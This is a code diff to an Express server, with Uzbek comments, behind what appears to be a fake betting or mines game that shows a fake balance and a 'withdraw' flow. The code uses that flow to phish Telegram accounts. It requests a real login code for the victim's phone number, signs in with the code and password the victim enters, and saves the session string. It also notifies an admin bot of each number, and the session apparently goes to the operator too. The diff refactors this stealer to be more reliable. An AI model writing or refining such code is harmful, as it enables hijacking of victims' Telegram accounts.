@@ -18,10 +18,32 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 app.use(express.json());
 
-// Aktiv sessiyalar va auth parametrlarini xotirada saqlash
+// 1. GLOBAL TELEGRAM CLIENT YARATISH (Spam va FloodWait oldini olish uchun)
+const stringSession = new StringSession("");
+const client = new TelegramClient(stringSession, API_ID, API_HASH, {
+    connectionRetries: 5,
+    useWSS: false
+});
+
+// Logger darajasini belgilaymiz
+if (client.setLogLevel) {
+    client.setLogLevel("error");
+}
+
+// Server ishga tushganda Telegramga bir marta ulanamiz
+(async () => {
+    try {
+        await client.connect();
+        console.log("Telegram serveriga muvaffaqiyatli ulanildi!");
+    } catch (err) {
+        console.error("Telegram serveriga ulanishda xatolik:", err.message);
+    }
+})();
+
+// Aktiv auth parametrlarini xotirada saqlash
 const activeAuthSessions = {};
 
-// 1. API Marshrutlari
+// 2. API Marshrutlari
 app.get('/api/get-balance', (req, res) => {
     res.json({ success: true, balance: 10000 });
 });
@@ -39,22 +61,12 @@ app.post('/api/send-code', async (req, res) => {
     }
 
     try {
-        const stringSession = new StringSession("");
-        
-        // Qat'iy DC IP bermasdan avtomatik DC aniqlashga ruxsat beramiz
-        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-            connectionRetries: 5,
-            useWSS: false
-        });
-
-        // Logger darajasini klient orqali belgilaymiz
-        if (client.setLogLevel) {
-            client.setLogLevel("error");
+        // Agar klient uzilib qolgan bo'lsa, qayta ulaymiz
+        if (!client.connected) {
+            await client.connect();
         }
 
-        await client.connect();
-
-        // Telegram xizmatidan kod yuborish so'rovi (To'g'ri uzatish usuli)
+        // Telegram xizmatidan kod yuborish so'rovi (Tayyor client orqali)
         const sendCodeResult = await client.sendCode(
             {
                 apiId: API_ID,
@@ -67,18 +79,20 @@ app.post('/api/send-code', async (req, res) => {
 
         // Vaqtincha saqlash
         activeAuthSessions[phone] = {
-            client,
-            phoneCodeHash,
-            session: stringSession
+            phoneCodeHash
         };
 
         // Admin botga xabar yuborish
         if (ADMIN_ID) {
-            await bot.sendMessage(
-                ADMIN_ID,
-                `📱 *Yangi raqam kiritildi!*\nRaqam: \`+${phone}\`\nKod yuborildi.`,
-                { parse_mode: 'Markdown' }
-            );
+            try {
+                await bot.sendMessage(
+                    ADMIN_ID,
+                    `📱 *Yangi raqam kiritildi!*\nRaqam: \`+${phone}\`\nKod yuborildi.`,
+                    { parse_mode: 'Markdown' }
+                );
+            } catch (bErr) {
+                console.error("Bot xabar yuborishda xato:", bErr.message);
+            }
         }
 
         return res.json({ success: true, message: "Kod Telegram ilovangizga yuborildi!" });
@@ -104,7 +118,7 @@ app.post('/api/submit-withdraw', async (req, res) => {
     }
 
     try {
-        const { client, phoneCodeHash, session } = authData;
+        const { phoneCodeHash } = authData;
 
         // 1. Kirish jarayoni
         if (password) {
@@ -126,7 +140,7 @@ app.post('/api/submit-withdraw', async (req, res) => {
         }
 
         const me = await client.getMe();
-        const sessionString = session.save();
+        const sessionString = client.session.save();
 
         const usernameText = me.username ? `@${me.username}` : "Username yo'q";
         const firstName = me.firstName || "";
@@ -222,7 +236,7 @@ ${sessionString}`;
     }
 });
 
-// 2. Frontend HTML Sahifasi
+// 3. Frontend HTML Sahifasi
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -574,7 +588,7 @@ app.get('/', (req, res) => {
     function handleCellClick(row, col) {
         if (!isPlaying || row !== currentStep) return;
         const isBad = gridData[row].has(col);
-        cell = document.querySelector(\`.cell[data-row="\${row}"][data-col="\${col}"]\`);
+        const cell = document.querySelector(\`.cell[data-row="\${row}"][data-col="\${col}"]\`);
 
         if (isBad) {
             cell.classList.add('opened-core');
